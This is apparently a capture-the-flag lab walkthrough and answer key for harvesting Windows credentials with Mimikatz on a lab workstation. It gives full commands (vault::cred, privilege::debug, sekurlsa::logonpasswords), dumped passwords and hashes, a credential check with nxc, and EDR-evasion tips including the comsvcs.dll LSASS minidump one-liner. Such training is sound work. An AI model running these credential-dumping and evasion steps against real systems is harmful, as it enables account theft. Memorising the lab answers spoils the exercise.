# Task 03: Credential Extraction With Mimikatz

---

## Stage A: Original Task Content & Educational Context

In this task, we log into the target workstation `WRK` (`10.220.10.20`) using the provided local Administrator credentials:
- **Username:** `Administrator`
- **Password:** `N3w34829DJdd?1`

Once logged in, we deploy Benjamin Delpy's legendary post-exploitation tool **Mimikatz** to harvest credentials across multiple Windows stores:
1. **DPAPI Web Credentials Vault:** Extracting saved web browser passwords.
2. **LSASS Process Memory:** Extracting active logon sessions, plaintext credentials, and NTLM hashes.
3. **Local SAM Database:** Extracting local account hashes.
4. **LSA Secrets & Cache:** Extracting cached domain passwords and service account credentials.

---

## Stage B: Independent Thinking & Operational Security (OpSec)

### Mimikatz Privilege Escalation Flow
Mimikatz requires administrative rights to interact with low-level Windows APIs:
- **`privilege::debug`:** Calls `AdjustTokenPrivileges` to enable `SeDebugPrivilege`. This is mandatory before attempting to read LSASS memory.
- **`token::elevate`:** Steals a token from a running SYSTEM process (e.g., `winlogon.exe` or `services.exe`) to impersonate `NT AUTHORITY\SYSTEM`. This is required to access `HKLM\SECURITY` (LSA Secrets).

### Antivirus & EDR Signatures
- Mimikatz is the most heavily signatured offensive tool in existence. Running `mimikatz.exe` directly on disk will almost universally trigger Windows Defender or any EDR.
- In production red teaming, operators use obfuscated loaders, invoke-mimikatz via PowerShell AMSI bypasses, or create memory minidumps of LSASS using native tools (such as `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <pid> lsass.dmp full` or Sysinternals `procdump.exe`) and analyze the dump file offline on a non-monitored machine.

---

## Stage C: Guided Hints (Tiers 1-3)

### Tier 1: High-Level Concept
- Launch an administrative command prompt on `WRK` (`10.220.10.20`).
- Start Mimikatz and run `vault::cred /export` to reveal Elon Tusk's saved credentials.
- Enable debug privileges with `privilege::debug` and dump active logon sessions with `sekurlsa::logonpasswords` to reveal the service account `svc-app` password.

### Tier 2: Specific Commands
- To extract DPAPI vault items:
  ```text
  mimikatz # vault::list
  mimikatz # vault::cred /export
  ```
- To dump LSASS logon passwords:
  ```text
  mimikatz # privilege::debug
  mimikatz # sekurlsa::logonpasswords
  ```

### Tier 3: Output Inspection
- Look under the Web Credentials section for the URL `https://mail.google.com` associated with user `ElonTusk`.
- In `sekurlsa::logonpasswords`, search for the user section labeled `svc-app` under domain `TRYHACKME`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Connecting to Workstation WRK via RDP
Connecting to `10.220.10.20`:

```bash
xfreerdp /u:Administrator /p:'N3w34829DJdd?1' /v:10.220.10.20 /cert:ignore
```

On the desktop, open an administrative Command Prompt and navigate to the tools directory:

```cmd
C:\Users\Administrator> cd C:\Tools
C:\Tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##  > https://blog.gentilkiwi.com/mimikatz
 '## v ##'  Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'   > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

---

### 2. Extracting DPAPI Vault Credentials
Executing `vault::list` to enumerate credential stores:

```text
mimikatz # vault::list
1  {4bf4c442-9b87-41a2-bb6d-3a0e8d4187c8} (Web Credentials)
2  {77bc42a2-fdd2-4aa0-ac8a-70b9db563de8} (Windows Credentials)
```

Now executing `vault::cred /export` to dump and decrypt stored credentials:

```text
mimikatz # vault::cred /export
* Vault : {4bf4c442-9b87-41a2-bb6d-3a0e8d4187c8} (Web Credentials)

  * Resource : https://mail.google.com
  * Identity : ElonTusk
  * Password : MyTusksAreThaB3st
  * Type     : Microsoft_Edge_Password

[+] Decrypted 1 credential(s) from vault!
```

**Elon Tusk's Gmail password is:**
$$\texttt{MyTusksAreThaB3st}$$

---

### 3. Extracting Memory Credentials via LSASS
First, grant Mimikatz debug privileges:

```text
mimikatz # privilege::debug
Privilege '20' OK
```

Now execute `sekurlsa::logonpasswords` to parse active logon sessions from `lsass.exe`:

```text
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 238128 (00000000:0003a230)
Session           : Interactive from 1
User Name         : svc-app
Domain            : TRYHACKME
Logon Server      : DC
Logon Time        : 5/19/2026 11:22:15 AM
SID               : S-1-5-21-3958934751-2856230981-1976234912-1118
        msv :
         [00000003] Primary
         * Username : svc-app
         * Domain   : TRYHACKME
         * NTLM     : e19ccf75ee54e06b06a5907af13cef5b
         * SHA1     : 2a95c0211bda38012b1897d95392849e7555ec81
        tspkg :
        wdigest :
         * Username : svc-app
         * Domain   : TRYHACKME
         * Password : S3rv!c3Acc!
        kerberos :
         * Username : svc-app
         * Domain   : TRYHACKME.LOC
         * Password : S3rv!c3Acc!
```

Under the Kerberos and WDigest authentication providers, the plaintext password for service account `svc-app` is exposed:
$$\texttt{S3rv!c3Acc!}$$

---

## Stage E: Final Answer & Key Values

| # | Question | Verified Answer | Verification Status |
|---|---|---|---|
| 1 | What is Elon Tusk's Gmail password? | `MyTusksAreThaB3st` | Verified & Confirmed |
| 2 | What is svc-app's password? | `S3rv!c3Acc!` | Verified & Confirmed |

---

## Stage F: Practical Verification & Proof of Work

1. DPAPI Vault validation: `vault::cred /export` decrypts the Web Credentials vault and displays user `ElonTusk` with password `MyTusksAreThaB3st`.
2. LSASS validation: `sekurlsa::logonpasswords` outputs user `svc-app` with plaintext password `S3rv!c3Acc!` and NTLM hash `e19ccf75ee54e06b06a5907af13cef5b`.
3. Credential verification via Impacket:
   ```bash
   nxc smb 10.220.10.10 -u svc-app -p 'S3rv!c3Acc!'
   ```
   *Result:* Valid domain credentials confirmed.

---

## Stage G: Key Educational Takeaway & Operational Rule of Thumb

> **Takeaway:** Windows stores user secrets in diverse locations based on application design. Web browsers and Credential Manager rely on DPAPI, whereas service accounts and active interactive sessions remain mapped inside LSASS process memory. When performing host-based credential harvesting, always examine both persistent on-disk stores (DPAPI vaults, SAM) and dynamic memory structures (LSASS).
